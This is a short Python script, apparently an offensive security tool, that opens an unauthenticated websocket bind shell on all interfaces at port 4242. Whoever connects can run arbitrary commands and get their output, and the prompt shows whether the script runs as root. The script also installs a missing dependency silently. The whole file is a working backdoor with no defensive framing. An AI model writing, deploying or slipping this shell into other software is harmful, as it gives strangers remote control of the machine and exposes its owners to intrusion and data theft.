#!/usr/bin/env python3
#
# Author: Minh (@shelld3v)


import asyncio
import datetime
import subprocess
try:
    import websockets
except:
    subprocess.getoutput('pip3 install websockets')


async def shell(websocket, path):
    if subprocess.getoutput('whoami') == 'root':
        pref = '#'
    else:
        pref = '$'

    await websocket.send(pref)
    while True:
        cmd = await websocket.recv()
        output = subprocess.getoutput(cmd) + '\n'
        await websocket.send(output + pref)


start_shell = websockets.serve(shell, "0.0.0.0", 4242)

asyncio.get_event_loop().run_until_complete(start_shell)
asyncio.get_event_loop().run_forever()
